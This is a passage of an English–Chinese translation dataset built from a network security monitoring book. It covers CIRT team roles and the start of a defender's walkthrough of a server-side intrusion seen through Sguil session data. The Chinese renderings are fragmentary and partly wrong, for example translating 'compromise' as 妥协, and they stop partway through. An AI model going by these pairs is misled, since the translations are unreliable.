  id: totrans-998
  prefs: []
  type: TYPE_NORMAL
  zh: 该小组通过使用软件工具支持其他两个CIRT组成部分的工作，
- en: ware developers who code production-grade tools. It designs, builds,
  id: totrans-999
  prefs: []
  type: TYPE_NORMAL
  zh: 软件开发人员，编写生产级工具。它设计、构建，
- en: deploys, and runs the collection, analysis, and escalation tools. It also
  id: totrans-1000
  prefs: []
  type: TYPE_NORMAL
  zh: 部署并运行收集、分析和升级工具。它还负责
- en: leads development of new detection and response techniques. While
  id: totrans-1001
  prefs: []
  type: TYPE_NORMAL
  zh: 引领新的检测和响应技术的开发。尽管
- en: the other teams may develop proof-of-concept tools to support their
  id: totrans-1002
  prefs: []
  type: TYPE_NORMAL
  zh: 其他团队可能会开发概念验证工具来支持他们的
- en: missions, the ID Team eventually assumes responsibility for those tools.
  id: totrans-1003
  prefs: []
  type: TYPE_NORMAL
  zh: 任务完成后，ID团队最终负责这些工具。
- en: '**204** Chapter 9'
  id: totrans-1004
  prefs: []
  type: TYPE_NORMAL
  zh: '**204** 第九章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1005
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Constituent Relations Team**'
  id: totrans-1006
  prefs: []
  type: TYPE_NORMAL
  zh: '**组成关系团队**'
- en: This group acts as an intermediary between the CIRT and its constitu-
  id: totrans-1007
  prefs: []
  type: TYPE_NORMAL
  zh: 该小组充当CIRT与其成员之间的中介。
- en: ents. These team members help keep things running smoothly between
  id: totrans-1008
  prefs: []
  type: TYPE_NORMAL
  zh: 这些团队成员帮助保持CIRT与其成员之间的顺畅运行。
- en: CIRT and constituents, and they represent the CIRT outside the com-
  id: totrans-1009
  prefs: []
  type: TYPE_NORMAL
  zh: CIRT与成员之间的关系，他们代表CIRT在公司外部进行工作。
- en: pany itself.
  id: totrans-1010
  prefs: []
  type: TYPE_NORMAL
  zh: 公司本身。
- en: '**conclusion**'
  id: totrans-1011
  prefs: []
  type: TYPE_NORMAL
  zh: '**结论**'
- en: This chapter explained the enterprise security cycle consisting of planning,
  id: totrans-1012
  prefs: []
  type: TYPE_NORMAL
  zh: 本章解释了包含规划、检测、响应等的企业安全周期，
- en: resistance, detection, and response phases. Many organizations pour all
  id: totrans-1013
  prefs: []
  type: TYPE_NORMAL
  zh: 抵抗、检测和响应阶段。许多组织将所有资源都投入到
- en: of their effort into planning and resistance, but invest next to nothing for
  id: totrans-1014
  prefs: []
  type: TYPE_NORMAL
  zh: 他们把大部分精力投入到规划和抵抗中，但几乎不投入任何资源到
- en: detection and response.
  id: totrans-1015
  prefs: []
  type: TYPE_NORMAL
  zh: 检测和响应。
- en: In recent years, as persistent intruders have sliced through routine
  id: totrans-1016
  prefs: []
  type: TYPE_NORMAL
  zh: 近年来，随着持续入侵者突破常规防线，
- en: defenses, organizations have begun to realize the value of detection and
  id: totrans-1017
  prefs: []
  type: TYPE_NORMAL
  zh: 防御措施，组织已经开始意识到检测和响应的价值。
- en: response. If adversaries lose access to an organization before they can accom-
  id: totrans-1018
  prefs: []
  type: TYPE_NORMAL
  zh: 响应。如果对手在能够完成其任务之前失去了对组织的访问权限，
- en: plish their mission, then they lose. The CIRT wins every time it defeats an
  id: totrans-1019
  prefs: []
  type: TYPE_NORMAL
  zh: 如果对手在完成任务之前失去访问权限，那么他们就失败了。CIRT每次战胜对手都获得胜利。
- en: adversary before he can steal, alter, or deny access to business information.
  id: totrans-1020
  prefs: []
  type: TYPE_NORMAL
  zh: 在对手能够窃取、篡改或拒绝访问商业信息之前拦截他。
- en: The NSM process of collection, analysis, escalation, and resolution is
  id: totrans-1021
  prefs: []
  type: TYPE_NORMAL
  zh: NSM过程包括收集、分析、升级和解决，这一过程至关重要。
- en: a powerful framework that can empower CIRTs and frustrate adversaries.
  id: totrans-1022
  prefs: []
  type: TYPE_NORMAL
  zh: 这是一个强大的框架，能够赋能CIRT并令对手陷入困境。
- en: In order to be successful, CIRTs must classify and count all incidents they
  id: totrans-1023
  prefs: []
  type: TYPE_NORMAL
  zh: 为了成功，CIRT必须对所有事件进行分类和计数，
- en: detect, as well as measure the time from incident detection to containment.
  id: totrans-1024
  prefs: []
  type: TYPE_NORMAL
  zh: 检测到事件，并衡量从事件检测到遏制所需的时间。
- en: They should develop time-sensitive processes for managing incidents, and
  id: totrans-1025
  prefs: []
  type: TYPE_NORMAL
  zh: 他们应当制定时间敏感的流程来管理事件，并
- en: structure themselves to offer a mix of detection, intelligence, and support
  id: totrans-1026
  prefs: []
  type: TYPE_NORMAL
  zh: 他们将自身构建成提供检测、情报和支持的混合体。
- en: functions.
  id: totrans-1027
  prefs: []
  type: TYPE_NORMAL
  zh: 功能。
- en: With this understanding in place, we now turn to a couple of case stud-
  id: totrans-1028
  prefs: []
  type: TYPE_NORMAL
  zh: 在理解这些内容后，我们现在转向几个案例研究
- en: ies showing NSM operations in action.
  id: totrans-1029
  prefs: []
  type: TYPE_NORMAL
  zh: 本章展示了NSM操作在实际中的应用。
- en: NSM Operations **205**
  id: totrans-1030
  prefs: []
  type: TYPE_NORMAL
  zh: NSM操作 **205**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1031
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1032
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**10**'
  id: totrans-1033
  prefs: []
  type: TYPE_NORMAL
  zh: '**10**'
- en: '**S e r v e r- S i D e c o M P r o M i S e**'
  id: totrans-1034
  prefs: []
  type: TYPE_NORMAL
  zh: '**服务器端的妥协**'
- en: This is the moment of truth. Now you are
  id: totrans-1035
  prefs: []
  type: TYPE_NORMAL
  zh: 这是关键时刻。现在你已经
- en: ready to see NSM in action. In this chapter,
  id: totrans-1036
  prefs: []
  type: TYPE_NORMAL
  zh: 准备好看到NSM实际操作了。在本章中，
- en: we’ll put the theory, tools, and process to
  id: totrans-1037
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将把理论、工具和过程应用到实际操作中
- en: work in a simple compromise scenario. So far,
  id: totrans-1038
  prefs: []
  type: TYPE_NORMAL
  zh: 在简单的妥协场景中工作。到目前为止，
- en: you’ve implemented a sensor using SO and collected
  id: totrans-1039
  prefs: []
  type: TYPE_NORMAL
  zh: 你已经使用SO实施了一个传感器并收集了
- en: some NSM data. Now you plan to analyze the avail-
  id: totrans-1040
  prefs: []
  type: TYPE_NORMAL
  zh: 一些NSM数据。现在你计划分析可用的
- en: able evidence.
  id: totrans-1041
  prefs: []
  type: TYPE_NORMAL
  zh: 提供充分的证据。
- en: This chapter demonstrates a server-side compromise—one of the major
  id: totrans-1042
  prefs: []
  type: TYPE_NORMAL
  zh: 本章展示了一个服务器端的妥协——这是主要的攻击方式之一。
- en: categories of malicious network activity you’re likely to encounter. The next
  id: totrans-1043
  prefs: []
  type: TYPE_NORMAL
  zh: 你可能会遇到的恶意网络活动的类别。接下来的内容
- en: chapter demonstrates a client-side compromise, which may be even more
  id: totrans-1044
  prefs: []
  type: TYPE_NORMAL
  zh: 本章展示了一个客户端妥协，这可能比服务器端变体更为常见。
- en: popular than the server-side variant. We begin with a server-side compro-
  id: totrans-1045
  prefs: []
  type: TYPE_NORMAL
  zh: 服务器端变体通常比客户端变体更受欢迎。我们从服务器端妥协开始。
- en: mise because it is conceptually easier to understand.
  id: totrans-1046
  prefs: []
  type: TYPE_NORMAL
  zh: 妥协因为它在概念上更容易理解。
- en: Because this is a book about NSM, in this chapter and Chapter 11 we’ll
  id: totrans-1047
  prefs: []
  type: TYPE_NORMAL
  zh: 因为这是一本关于NSM的书，在本章和第十一章中，我们将
- en: look at intrusion patterns for two popular network-centric attack types.
  id: totrans-1048
  prefs: []
  type: TYPE_NORMAL
  zh: 查看两种流行的网络攻击类型的入侵模式。
- en: For example, I won’t discuss inserting a malicious USB drive into a laptop,
  id: totrans-1049
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，我不会讨论将恶意USB驱动器插入笔记本电脑，
- en: or password guessing by a rogue insider sitting at an internal computer
  id: totrans-1050
  prefs: []
  type: TYPE_NORMAL
  zh: 或者恶意内部人员通过内网计算机进行密码猜测等攻击
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1051
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: terminal. Instead, we’ll focus on attacks across the network. These are *remote*
    attacks, rather than *local* variants requiring interaction with a system that
    is physically or virtually already available to an intruder.
  id: totrans-1052
  prefs: []
  type: TYPE_NORMAL
- en: '**Server-side compromise defined**'
  id: totrans-1053
  prefs: []
  type: TYPE_NORMAL
- en: A *server-side compromise* involves an intruder deciding to attack an applica-
  id: totrans-1054
  prefs: []
  type: TYPE_NORMAL
- en: tion exposed to the Internet. The application could be a web service, a
  id: totrans-1055
  prefs: []
  type: TYPE_NORMAL
- en: file transfer protocol service, a database, or any other software listening
    to
  id: totrans-1056
  prefs: []
  type: TYPE_NORMAL
- en: Internet traffic. Figure 10-1 shows a generic attack pattern for a server-side
  id: totrans-1057
  prefs: []
  type: TYPE_NORMAL
- en: compromise.
  id: totrans-1058
  prefs: []
  type: TYPE_NORMAL
- en: 1\. Intruder initiates attack against exposed,
  id: totrans-1059
  prefs: []
  type: TYPE_NORMAL
- en: vulnerable application on victim system.
  id: totrans-1060
  prefs: []
  type: TYPE_NORMAL
- en: NETWORK CONNECTION
  id: totrans-1061
  prefs: []
  type: TYPE_NORMAL
- en: Intruder
  id: totrans-1062
  prefs: []
  type: TYPE_NORMAL
- en: Victim
  id: totrans-1063
  prefs: []
  type: TYPE_NORMAL
- en: 2\. Attack method exploits vulnerable application
  id: totrans-1064
  prefs: []
  type: TYPE_NORMAL
- en: Exploited
  id: totrans-1065
  prefs: []
  type: TYPE_NORMAL
- en: on victim system to execute code or commands.
  id: totrans-1066
  prefs: []
  type: TYPE_NORMAL
- en: NETWORK CONNECTION
  id: totrans-1067
  prefs: []
  type: TYPE_NORMAL
- en: Intruder
  id: totrans-1068
  prefs: []
  type: TYPE_NORMAL
- en: Victim
  id: totrans-1069
  prefs: []
  type: TYPE_NORMAL
- en: '3\. Malicious code interacts with intruder using one of three ways:'
  id: totrans-1070
  prefs: []
  type: TYPE_NORMAL
- en: a. Intruder repurposes existing connection to victim application
  id: totrans-1071
  prefs: []
  type: TYPE_NORMAL
- en: OR
  id: totrans-1072
  prefs: []
  type: TYPE_NORMAL
- en: b. Intruder initiates new connection to backdoor created by
  id: totrans-1073
  prefs: []
  type: TYPE_NORMAL
- en: malicious code
  id: totrans-1074
  prefs: []
  type: TYPE_NORMAL
- en: OR
  id: totrans-1075
  prefs: []
  type: TYPE_NORMAL
- en: c. Malicious code causes victim to reach back to intruder
  id: totrans-1076
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 10-1: Server-side compromise at ack pat ern*'
  id: totrans-1077
  prefs: []
  type: TYPE_NORMAL
- en: The intruder will reach out to the application to learn more about
  id: totrans-1078
  prefs: []
  type: TYPE_NORMAL
- en: it. This act of reconnaissance qualifies as a Cat 6 incident, as discussed
  id: totrans-1079
  prefs: []
  type: TYPE_NORMAL
- en: in Chapter 9 (see Figure 9-5). If the intruder tries to take advantage of
  id: totrans-1080
  prefs: []
  type: TYPE_NORMAL
- en: any vulnerabilities in its code, that act qualifies as a Cat 3 incident. If
    the
  id: totrans-1081
  prefs: []
  type: TYPE_NORMAL
- en: intruder manages to get the application to do his evil bidding, the attack
  id: totrans-1082
  prefs: []
  type: TYPE_NORMAL
- en: is successful and *exploitation* has occurred. According to the categories out-
  id: totrans-1083
  prefs: []
  type: TYPE_NORMAL
- en: lined in Figure 9-5, we now have a Cat 1 intrusion on our hands. After the
  id: totrans-1084
  prefs: []
  type: TYPE_NORMAL
- en: intruder executes malicious code or commands on the victim computer, he
  id: totrans-1085
  prefs: []
  type: TYPE_NORMAL
- en: opens one or more channels to further enhance his control of the system.
  id: totrans-1086
  prefs: []
  type: TYPE_NORMAL
- en: This is called a *command-and-control (C2)* channel. Establishing a C2 channel
  id: totrans-1087
  prefs: []
  type: TYPE_NORMAL
- en: qualifies the activity as a Breach 3 intrusion.
  id: totrans-1088
  prefs: []
  type: TYPE_NORMAL
- en: Once the intruder establishes C2 with the victim, he can execute the
  id: totrans-1089
  prefs: []
  type: TYPE_NORMAL
- en: rest of his game plan. Perhaps he wants to steal information from this first
  id: totrans-1090
  prefs: []
  type: TYPE_NORMAL
- en: victim. Perhaps he wants to pivot from the first victim to another computer
  id: totrans-1091
  prefs: []
  type: TYPE_NORMAL
- en: '**208** Chapter 10'
  id: totrans-1092
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1093
  prefs: []
  type: TYPE_NORMAL
- en: or application inside the company. Maybe he wants to bounce through this victim
    and attack an entirely different organization, using the newly compromised victim
    as a *hop,* or jumping-off point.
  id: totrans-1094
  prefs: []
  type: TYPE_NORMAL
- en: Regardless of what the attacker chooses to do next, the goals of the
  id: totrans-1095
  prefs: []
  type: TYPE_NORMAL
- en: CIRT at this point are to quickly scope the extent of the intrusion and to
  id: totrans-1096
  prefs: []
  type: TYPE_NORMAL
- en: take rapid containment actions to mitigate risk of data loss, alteration, and
  id: totrans-1097
  prefs: []
  type: TYPE_NORMAL
- en: degradation.
  id: totrans-1098
  prefs: []
  type: TYPE_NORMAL
- en: '**Server-side compromise in action**'
  id: totrans-1099
  prefs: []
  type: TYPE_NORMAL
- en: For this chapter’s example, we’ll walk through a server-side compromise
  id: totrans-1100
  prefs: []
  type: TYPE_NORMAL
- en: that occurs when an intruder attacks an exposed service on a vulnerable
  id: totrans-1101
  prefs: []
  type: TYPE_NORMAL
- en: computer that is monitored by a stand-alone NSM platform running SO.
  id: totrans-1102
  prefs: []
  type: TYPE_NORMAL
- en: We’ll examine what a sample intrusion looks like in NSM data, and figure
  id: totrans-1103
  prefs: []
  type: TYPE_NORMAL
- en: out how to make sense of that data.
  id: totrans-1104
  prefs: []
  type: TYPE_NORMAL
- en: The target network is a new segment on the Vivian’s Pets network, as
  id: totrans-1105
  prefs: []
  type: TYPE_NORMAL
- en: shown in Figure 10-2\. The network consists of a server (192.168.3.5), a desk-
  id: totrans-1106
  prefs: []
  type: TYPE_NORMAL
- en: top (192.168.3.13), and supporting network equipment. An NSM sensor
  id: totrans-1107
  prefs: []
  type: TYPE_NORMAL
- en: watches the uplink to the Internet through a network tap. The company
  id: totrans-1108
  prefs: []
  type: TYPE_NORMAL
- en: CIRT members created what they believed was an isolated test network
  id: totrans-1109
  prefs: []
  type: TYPE_NORMAL
- en: with a few computers in order to learn more about security. Unfortunately,
  id: totrans-1110
  prefs: []
  type: TYPE_NORMAL
- en: they failed to effectively protect the systems on this segment. In the process
  id: totrans-1111
  prefs: []
  type: TYPE_NORMAL
- en: of trying to learn more about computer security, they may have exposed the
  id: totrans-1112
  prefs: []
  type: TYPE_NORMAL
- en: company to additional risk.
  id: totrans-1113
  prefs: []
  type: TYPE_NORMAL
- en: Internet
  id: totrans-1114
  prefs: []
  type: TYPE_NORMAL
- en: NSM
  id: totrans-1115
  prefs: []
  type: TYPE_NORMAL
- en: Test
  id: totrans-1116
  prefs: []
  type: TYPE_NORMAL
- en: Network
  id: totrans-1117
  prefs: []
  type: TYPE_NORMAL
- en: Tap
  id: totrans-1118
  prefs: []
  type: TYPE_NORMAL
- en: Server
  id: totrans-1119
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.5
  id: totrans-1120
  prefs: []
  type: TYPE_NORMAL
- en: Desktop
  id: totrans-1121
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.13
  id: totrans-1122
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 10-2: Test network on Vivian’s Pets network*'
  id: totrans-1123
  prefs: []
  type: TYPE_NORMAL
- en: Server-side Compromise **209**
  id: totrans-1124
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1125
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 124](index-244_1.png)'
  id: totrans-1126
  prefs: []
  type: TYPE_IMG
- en: In this configuration, the NSM platform will see traffic to and from the
  id: totrans-1127
  prefs: []
  type: TYPE_NORMAL
- en: test network. For simplicity, I’ve configured the network so that NAT is not
  id: totrans-1128
  prefs: []
  type: TYPE_NORMAL
- en: required, and when you see the test network interacting with computers out-
  id: totrans-1129
  prefs: []
  type: TYPE_NORMAL
- en: side the Vivian’s Pets network, you should assume that no translation takes
  id: totrans-1130
  prefs: []
  type: TYPE_NORMAL
- en: place. (In the real world, you would likely need to deal with some degree of
  id: totrans-1131
  prefs: []
  type: TYPE_NORMAL
- en: obfuscation due to NAT issues, as described in Chapter 2.)
  id: totrans-1132
  prefs: []
  type: TYPE_NORMAL
- en: '***Starting with Sguil***'
  id: totrans-1133
  prefs: []
  type: TYPE_NORMAL
- en: The work of the Vivian’s Pets CIRT begins with a visit to its Sguil console,
  id: totrans-1134
  prefs: []
  type: TYPE_NORMAL
- en: which the team uses as its primary interface to NSM data. Recall that Sguil
  id: totrans-1135
  prefs: []
  type: TYPE_NORMAL
- en: allows analysts to investigate alerts by viewing session and full content data,
  id: totrans-1136
  prefs: []
  type: TYPE_NORMAL
- en: as well as some transaction data.
  id: totrans-1137
  prefs: []
  type: TYPE_NORMAL
- en: One day, an analyst logs in to the Sguil console for the NSM platform
  id: totrans-1138
  prefs: []
  type: TYPE_NORMAL
- en: shown in Figure 10-2 and sees the alerts shown in Figure 10-3\.
  id: totrans-1139
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 10-3: Sguil console for Vivian’s Pets*'
  id: totrans-1140
  prefs: []
  type: TYPE_NORMAL
- en: The default Sguil console displays alert data. The alerts shown here
  id: totrans-1141
  prefs: []
  type: TYPE_NORMAL
- en: are generated primarily by the PRADS passive asset detection system
  id: totrans-1142
  prefs: []
  type: TYPE_NORMAL
- en: (with entries prefaced by PADS) and by the Snort IDS engine (with entries
  id: totrans-1143
  prefs: []
  type: TYPE_NORMAL
- en: prefaced by GPL or ET).
  id: totrans-1144
  prefs: []
  type: TYPE_NORMAL
- en: We see a slew of PRADS events with source IP address 203.0.113.10\.
  id: totrans-1145
  prefs: []
  type: TYPE_NORMAL
- en: This IP address represents a remote intruder. (The 203.0.113.0/24 net
  id: totrans-1146
  prefs: []
  type: TYPE_NORMAL
- en: block is reserved for documentation purposes per RFC 5735, along with
  id: totrans-1147
  prefs: []
  type: TYPE_NORMAL
- en: the 198.51.100.0/24 net block we saw in Chapter 2.)
  id: totrans-1148
  prefs: []
  type: TYPE_NORMAL
- en: '**210** Chapter 10'
  id: totrans-1149
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1150
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 125](index-245_1.png)'
  id: totrans-1151
  prefs: []
  type: TYPE_IMG
- en: The events starting with Alert ID 4.75 and ending with 4.87 represent
  id: totrans-1152
  prefs: []
  type: TYPE_NORMAL
- en: 'PRADS reporting the discovery of new services on two computers: 192.168.3.5'
  id: totrans-1153
  prefs: []
  type: TYPE_NORMAL
- en: and 192.168.3.13, the two systems in the test network segment shown in
  id: totrans-1154
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10-2\. As PRADS learns about services by watching computers interact
  id: totrans-1155
  prefs: []
  type: TYPE_NORMAL
- en: with them, it generates these sorts of alerts. Here, the result is a handy sum-
  id: totrans-1156
  prefs: []
  type: TYPE_NORMAL
- en: mary of at least some of the services that the remote intruder at 203.0.113.10
  id: totrans-1157
  prefs: []
  type: TYPE_NORMAL
- en: appears to have discovered. Starting at 2013-03-09 21:32:07, the timestamp
  id: totrans-1158
  prefs: []
  type: TYPE_NORMAL
- en: on the first alert with 203.0.113.10 as the source IP address, we see that
  id: totrans-1159
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.10 conducted network reconnaissance against at least two com-
  id: totrans-1160
  prefs: []
  type: TYPE_NORMAL
- en: puters in the test network.
  id: totrans-1161
  prefs: []
  type: TYPE_NORMAL
- en: What about the other activity? The first alert, with source IP address
  id: totrans-1162
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.130, appears to be PRADS reporting the discovery of a DNS server
  id: totrans-1163
  prefs: []
  type: TYPE_NORMAL
- en: on 192.168.3.1\. That is not unusual. The alerts after the PRADS events from
  id: totrans-1164
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.10 appear to be more worrying.
  id: totrans-1165
  prefs: []
  type: TYPE_NORMAL
- en: Before digging into these alerts, let’s take a slight detour to validate our
  id: totrans-1166
  prefs: []
  type: TYPE_NORMAL
- en: hypothesis that 203.0.113.10 conducted network reconnaissance against this
  id: totrans-1167
  prefs: []
  type: TYPE_NORMAL
- en: test network.
  id: totrans-1168
  prefs: []
  type: TYPE_NORMAL
- en: '***Querying Sguil for Session Data***'
  id: totrans-1169
  prefs: []
  type: TYPE_NORMAL
- en: To determine just what network reconnaissance 203.0.113.10 performed,
  id: totrans-1170
  prefs: []
  type: TYPE_NORMAL
- en: we can query Sguil for session data to or from 203.0.113.10\. Because of the
  id: totrans-1171
  prefs: []
  type: TYPE_NORMAL
- en: number of target services in the Sguil console, we can guess that 203.0.113.10
  id: totrans-1172
  prefs: []
  type: TYPE_NORMAL
- en: scanned many TCP ports on the two target computers. Therefore, when we
  id: totrans-1173
  prefs: []
  type: TYPE_NORMAL
- en: query for session data in Sguil, we’ll manually adjust the session limit count
  id: totrans-1174
  prefs: []
  type: TYPE_NORMAL
- en: upward from 1000 results to 10,000 results.
  id: totrans-1175
  prefs: []
  type: TYPE_NORMAL
- en: To perform the session data query, we highlight one of the alert records
  id: totrans-1176
  prefs: []
  type: TYPE_NORMAL
- en: showing 203.0.113.10 as the source IP address, and then select **Advanced**
  id: totrans-1177
  prefs: []
  type: TYPE_NORMAL
- en: '**Query**4**Query Sancp Table**4**Query SrcIP**, as shown in Figure 10-4\.'
  id: totrans-1178
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 10-4: Querying for session data using the source IP address*'
  id: totrans-1179
  prefs: []
  type: TYPE_NORMAL
- en: The resulting Query Builder window offers two Where Clause boxes for
  id: totrans-1180
  prefs: []
  type: TYPE_NORMAL
- en: us to edit. We need to make sure that the default start times for the session
  id: totrans-1181
  prefs: []
  type: TYPE_NORMAL
- en: records will capture the data we care about. In this case, the activity began
  id: totrans-1182
  prefs: []
  type: TYPE_NORMAL
- en: on March 9, 2013, at 21:32:07 UTC, so we modify the Where Clause boxes
  id: totrans-1183
  prefs: []
  type: TYPE_NORMAL
- en: to search for the proper time, as shown in Listing 10-1\.
  id: totrans-1184
  prefs: []
  type: TYPE_NORMAL
- en: Server-side Compromise **211**
  id: totrans-1185
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1186
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 126](index-246_1.png)'
  id: totrans-1187
  prefs: []
  type: TYPE_IMG
- en: 'WHERE sancp.start_time > ''2013-03-09'' AND sancp.src_ip = INET_ATON(''203.0.113.10'')
    *Listing 10-1: Search syntax for session data involving 203.0.113.10*'
  id: totrans-1188
  prefs: []
  type: TYPE_NORMAL
- en: After also adjusting the LIMIT field in the Query Builder window from
  id: totrans-1189
  prefs: []
  type: TYPE_NORMAL
- en: 1000 to 10,000 results, we choose **Submit** to run the query. The answer from
  id: totrans-1190
  prefs: []
  type: TYPE_NORMAL
- en: the Sguil database produces 2104 records, beginning with those shown in
  id: totrans-1191
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10-5\.
  id: totrans-1192
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 10-5: Session data to or from 203.0.113.10 showing reconnaissance phases
    1 and 2, and the beginning of phase 3*'
  id: totrans-1193
  prefs: []
  type: TYPE_NORMAL
- en: The activity from 203.0.113.10 begins at 2013-03-09 21:31:44\. We can
  id: totrans-1194
  prefs: []
  type: TYPE_NORMAL
- en: break the sequence of events into several distinct elements.
  id: totrans-1195
  prefs: []
  type: TYPE_NORMAL
- en: • First, the attacker uses ICMP (IP Protocol 1) to perform reconnaissance
  id: totrans-1196
  prefs: []
  type: TYPE_NORMAL
- en: against a subset of systems on the 192.168.3.0/24 network. We can’t be
  id: totrans-1197
  prefs: []
  type: TYPE_NORMAL
- en: sure, but perhaps the intruder did earlier reconnaissance (not recorded
  id: totrans-1198
  prefs: []
  type: TYPE_NORMAL
- en: here) that led him to try to ping only these six systems. The ICMP scan
  id: totrans-1199
  prefs: []
  type: TYPE_NORMAL
- en: is phase 1\. He begins phase 2 at 2013-03-09 21:31:45, consisting of scans
  id: totrans-1200
  prefs: []
  type: TYPE_NORMAL
- en: against ports 80 and 443 TCP on several systems.
  id: totrans-1201
  prefs: []
  type: TYPE_NORMAL
- en: '**212** Chapter 10'
  id: totrans-1202
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1203
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 127](index-247_1.png)'
  id: totrans-1204
  prefs: []
  type: TYPE_IMG
- en: • Phase 3 begins at 2013-03-09 21:32:01 with scans against a wide variety
  id: totrans-1205
  prefs: []
  type: TYPE_NORMAL
- en: of TCP ports. In phase 4, also at the same timestamp, we see smaller
  id: totrans-1206
  prefs: []
  type: TYPE_NORMAL
- en: scans of what are likely open ports. (The activity is so fast that it appears
  id: totrans-1207
  prefs: []
  type: TYPE_NORMAL
- en: to all start in the same second of time.)
  id: totrans-1208
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10-6 shows the end of phase 3 and the beginning of phase 4\.
  id: totrans-1209
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 10-6: Reconnaissance phase 3 ends and phase 4 begins.*'
  id: totrans-1210
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10-7 shows that phase 4 ends at 2013-03-09 21:32:06 with the
  id: totrans-1211
  prefs: []
  type: TYPE_NORMAL
- en: intruder changing tactics again. At 2013-03-09 21:32:07, he conducts addi-
  id: totrans-1212
  prefs: []
  type: TYPE_NORMAL
- en: tional reconnaissance, beginning phase 5—interrogating active services.
  id: totrans-1213
  prefs: []
  type: TYPE_NORMAL
- en: We see him sending and receiving higher amounts of data as shown in the
  id: totrans-1214
  prefs: []
  type: TYPE_NORMAL
- en: far-right columns in Figure 10-7\. (Higher counts of data sent between two
  id: totrans-1215
  prefs: []
  type: TYPE_NORMAL
- en: computers typically signify a more “meaningful” conversation. Low counts
  id: totrans-1216
  prefs: []
  type: TYPE_NORMAL
- en: are usually just exchanges of state information for the TCP three-way hand-
  id: totrans-1217
  prefs: []
  type: TYPE_NORMAL
- en: shake, for example.)
  id: totrans-1218
  prefs: []
  type: TYPE_NORMAL
- en: The four right-most columns in Figures 10-5 through 10-8 show packets
  id: totrans-1219
  prefs: []
  type: TYPE_NORMAL
- en: and data sent by the source, and packets and data sent by the destination.
  id: totrans-1220
  prefs: []
  type: TYPE_NORMAL
- en: The intruder is likely profiling the target active services using a recon-
  id: totrans-1221
  prefs: []
  type: TYPE_NORMAL
- en: naissance tool to gather information about the services available. The
  id: totrans-1222
  prefs: []
  type: TYPE_NORMAL
- en: intruder compares information derived from the scan to find available
  id: totrans-1223
  prefs: []
  type: TYPE_NORMAL
- en: attack methods, and if he finds one that takes advantage of an exposed
  id: totrans-1224
  prefs: []
  type: TYPE_NORMAL
- en: vulnerability, he will exploit that weakness.
  id: totrans-1225
  prefs: []
  type: TYPE_NORMAL
- en: Server-side Compromise **213**
  id: totrans-1226
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1227
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 128](index-248_1.png)'
  id: totrans-1228
  prefs: []
  type: TYPE_IMG
- en: '*Figure 10-7: Reconnaissance phase 4 ends and phase 5 begins.*'
  id: totrans-1229
  prefs: []
  type: TYPE_NORMAL
- en: The final phase of the activity begins at 2013-03-09 21:38:38, as shown
  id: totrans-1230
  prefs: []
  type: TYPE_NORMAL
- en: in Figure 10-8\. The intruder’s reconnaissance tool has finished gathering
  id: totrans-1231
  prefs: []
  type: TYPE_NORMAL
- en: information, and he pauses to review his results. After discovering a weak-
  id: totrans-1232
  prefs: []
  type: TYPE_NORMAL
- en: ness, he appears to exploit it, although that may not be obvious from the ses-
  id: totrans-1233
  prefs: []
  type: TYPE_NORMAL
- en: sion data shown. (We’ll examine this alert data on the original Sguil console
  id: totrans-1234
  prefs: []
  type: TYPE_NORMAL
- en: for clarification.) For now, review the session records starting at 21:38:38\.
  id: totrans-1235
  prefs: []
  type: TYPE_NORMAL
- en: The sessions beginning at 21:38:38 look very different from the earlier
  id: totrans-1236
  prefs: []
  type: TYPE_NORMAL
- en: ones. One of the sessions shows the transfer of a lot of data, involving port
    6200
  id: totrans-1237
  prefs: []
  type: TYPE_NORMAL
- en: TCP. Another session (records showing activity involving port 21 TCP) shows
  id: totrans-1238
  prefs: []
  type: TYPE_NORMAL
- en: an active FTP command channel. Having seen five phases of reconnaissance
  id: totrans-1239
  prefs: []
  type: TYPE_NORMAL
- en: from 203.0.113.10, followed by focused activity involving ports 21 and 6200
  id: totrans-1240
  prefs: []
  type: TYPE_NORMAL
- en: TCP, we should take a close look at these last connections.
